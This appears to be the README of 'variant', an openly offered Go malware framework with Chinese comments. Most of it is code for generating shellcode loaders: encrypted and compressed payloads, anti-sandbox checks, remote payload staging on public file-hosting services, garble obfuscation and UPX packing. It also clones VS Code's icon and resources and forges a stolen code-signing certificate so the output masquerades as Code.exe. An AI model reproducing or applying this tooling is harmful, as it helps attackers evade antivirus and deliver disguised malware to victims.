# variant

Golang Malware Framework

## Description

Code Usage

## Tmpl Struct

动态模板支持

```go
package render

type TmplOpts struct {
	TmplFile     string      // 模板文件路径
	OutputDir    string      // 输出目录路径
	OutputGoName string      // 输出的 Go 文件名
	Data         interface{} // 基础模板渲染数据
}

type TmplData struct {
	CipherText string      // 保存加密文本的变量名
	PlainText  string      // 保存解密文本的变量名
	DLLibrary  interface{} // Dynamic Link Library - DLL
	Pokemon    interface{} // Pokemon 加载模式
	Loader     interface{} // 加载器
	SandBox    interface{} // 反沙箱模块
	Local      interface{} // 本地加载模块
	Remote     interface{} // 远程加载模块
	Args       interface{} // 参数加载模块
	Compressor interface{} // 压缩算法模块
	Apart      interface{} // 分离加载模块
	Dynamic    interface{} // 动态数据
}

type Loader struct {
	Import string // 导入库
	Method string // loader
}

type SandBox struct {
	Import  string   // 导入库
	Methods []string // 反沙箱函数
}

type Compressor struct {
	Import    string // 导入库
	Algorithm string // 压缩算法
	Ratio     int    // lzw 压缩率, 一般为8
}

type Local struct {
	KeyName      string      // Key 变量名
	KeyValue     string      // Key 值
	IvName       string      // Iv  变量名
	IvValue      string      // Iv  值
	Payload      interface{} // 加密 shellcode
	DecryptLocal string      // 解密函数
	MainLocal    string      // 本地加载方法名
}

type Remote struct {
	Import     string // 导入库
	Url        string // 远程加载Url
	Method     string // 请求方法
	UCFileCode string // UsersCloud加载的参数
	UCMethod   string // 读取UsersCloud的Payload
}

type Dynamic struct {
	Import         string // 导入库
	DynamicUrl     string // 远程读取shellcode的url
	DynamicMethod  string // 动态函数
	MainDynamic    string // 动态加载函数名
	DecryptDynamic string // 解密函数
	KeyName        string // Key 变量名
	HexValue       string // 动态获取的 Key & IV 的值集合
	KeyStart       int    // Key 动态起始区间
	KeyEnd         int    // Key 动态结束区间
	IVName         string // IV 变量名
	IVStart        int    // IV 动态起始区间
	IVEnd          int    // IV 动态结束区间
}

type Args struct {
	Import  string // 导入库
	ArgsKey string // 参数加载设置的密钥
}

type Pokemon struct {
	PokemonPayload []string // Pokemon 加密数组
	MainPokemon    string   // Pokemon 函数名
	DecryptPokemon string   // 解密函数
}

type DLLibrary struct {
	DllFuncName string // 导出DLL函数名
}
```

## Compile

### Windows

使用特殊编译参数需要设置的环境变量，推荐设置系统环境变量的方式，使用框架来进行编译

```cmd
# 手动编译，设置临时环境变量
set GOPRIVATE=* 
set GOGARBLE=* 
```

### Compiler Support

```go
// 基础参数：ldflags="-s -w -H=windowsgui" -trampath
// GoCompile 使用GoCompiler进行编译
func (c CompileOpts) GoCompile() error {
	comp := NewGoCompiler(c)
	return c.compile(comp)
}

// GarbleCompile 使用GarbleCompiler进行编译
func (c CompileOpts) GarbleCompile() error {
	comp := NewGarbleCompiler(c)
	return c.compile(comp)
}
```

## Remote ShellCode Exec

### UsersCloud

```go
	// 上传远程加载的Payload到第三方
	uc := remote.UsersCloud{
		Path: "output",
		Src:  params.FileName,
	}

	// 设置远程加载渲染模板
	remoteSet := render.Remote{
		Import:     "variant/remote",
		UCFileCode: uc.UCUpload(),
		UCMethod:   "remote.UCRead",
	}
```

### Transfer

```go
	// 上传远程加载的Payload到第三方
	cUrl := remote.Transfer{
		Src:   params.FileName,
		Path:  "path to output",
		Proxy: "192.168.31.10:2080",
	}
	// 设置远程加载渲染模板
	remoteSet := render.Remote{
		Import:  "variant/remote",
		Url:     cUrl. TransferUpload(),
		Method:  "remote.RestyStrings",
	}
```

### File.io

```go
	// 上传远程加载的Payload到第三方
	fi := remote.FileIO{
		Src:  params.FileName,
		Path: "output",
	}

	// 设置远程加载渲染模板
	remoteSet := render.Remote{
		Import: "variant/remote",
		Url:    fi.Upload(),
		Method: "remote.FileIORead",
	}
```

## Executable Packer

### Upx

```go
	// 压缩参数
	upx := build.UpxOpts{
		Level:   "--lzma",
		Keep:    true,
		Force:   true,
		SrcExe:  cOpts.ExeFileName,
		SrcPath: "output",
		UpxPath: "build",
	}

	// 执行压缩
	err = upx.UpxPacker()
	if err != nil {
		log.Fatal(err)
	}
```

## Demo

```go
package main

import (
	"variant/build"
	"variant/compress"
	"variant/crypto"
	"variant/encoder"
	"variant/log"
	"variant/rand"
	"variant/render"
)

func main() {
	// 反沙箱模块
	sandbox := render.SandBox{
		Import: "variant/sandbox",
		Methods: []string{
			"sandbox.GetDesktopFiles",
			"sandbox.BootTimeGetTime",
		}}

	// 压缩算法模块
	compressor := render.Compressor{
		Import:    "variant/compress",
		Algorithm: "compress.LzwDecompress",
		Ratio:     8,
	}

	// 设置加密参数
	params := encoder.Payload{
		PlainText: "output/calc.bin",
		FileName:  rand.RStrings(),
		Path:      "output",
		Key:       rand.LByteStrings(16),
		IV:        rand.LByteStrings(16),
	}
	// 读取shellcode，返回加密之后的 strings
	payload, err := params.SetKeyIV(crypto.XorAesHexBase85Encrypt) // 传入加密方法，根据加密方法的签名渲染模板
	if err != nil {
		log.Fatal(err)
	}

	// 压缩算法
	payload, _ = compress.LzwCompress([]byte(payload), 8)

	// 本地加载需要的数据
	local := render.Local{
		Payload:      payload,
		KeyName:      rand.RStrings(),
		KeyValue:     string(params.Key),
		IvName:       rand.RStrings(),
		IvValue:      string(params.IV),
		MainLocal:    rand.RStrings(),
		DecryptLocal: "crypto.XorAesHexBase85Decrypt",
	}

	load := render.Loader{
		Import: "variant/loader",
		Method: "loader.EnumerateLoadedModulesLoad",
	}

	// 定义模板渲染数据
	data := render.TmplData{
		CipherText: rand.RStrings(),
		PlainText:  rand.RStrings(),
		Loader:     load,
		Local:      local,
		SandBox:    sandbox,
		Compressor: compressor,
		//Args:          args,
	}

	// 设置模板的渲染参数
	tOpts := render.TmplOpts{
		TmplFile:     "render/templates/v6/Base.tmpl",
		OutputDir:    "output",
		OutputGoName: build.RandomGoFileName(),
		Data:         data,
	}
	// 生成模板
	err = tOpts.TmplRender()
	if err != nil {
		log.Fatal(err)
	}

	// 编译参数
	cOpts := build.CompileOpts{
		GoFileName:  tOpts.OutputGoName,
		ExeFileName: build.RenameGoTrimSuffix(tOpts.OutputGoName),
		HideConsole: false,
		CompilePath: "output",
		BuildMode:   "pie",
		Literals:    true,
		GSeed:       true,
		Tiny:        true,
		GDebug:      false,
	}

	// 编译
	if err = cOpts.GoCompile(); err != nil {
		log.Fatal(err)
	}

	// 添加图标和文件信息
	winres := gores.GoWinRes{
		CompilePath: "output",          // 指定编译目录
		ExtractFile: "Code.exe",        // 指定提取资源文件的对象
		ExtractDir:  "",                // 指定提取资源文件后输出的路径
		PatchFile:   cOpts.ExeFileName, // 指定使用 Patch 添加资源文件的对象
	}

	// 提取 vscode 所有的资源文件
	err = winres.Extract()
	if err != nil {
		log.Fatal(err)
	}

	// 使用 Patch 添加资源文件到编译后的程序
	err = winres.HandleWinRes()
	if err != nil {
		log.Fatal(err)
	}

	// 伪造证书配置
	ct := build.CertThief{
		SignDir:  "output",
		SrcFile:  cOpts.ExeFileName,
		DstFile:  "Code.exe",
		SignedPE: build.RenameSignedPEName(cOpts.ExeFileName),
		CertFile: "Code.der",
	}

	// 保存证书
	err = ct.SaveCertificate()
	if err != nil {
		log.Fatal(err)
	}

	// 利用EXE进行签名伪造
	err = ct.SignExecutable()
	if err != nil {
		log.Fatal(err)
	}

	// 利用证书进行签名伪造
	err = ct.SignWithStolenCert()
	if err != nil {
		log.Fatal(err)
	}

	// 压缩参数
	upx := build.UpxOpts{
		Level:   "--lzma",
		Keep:    true,
		Force:   true,
		SrcExe:  ct.Signed,
		SrcPath: "output",
		UpxPath: "build",
	}

	// 执行压缩
	err = upx.UpxPacker()
	if err != nil {
		log.Fatal(err)
	}
}
```
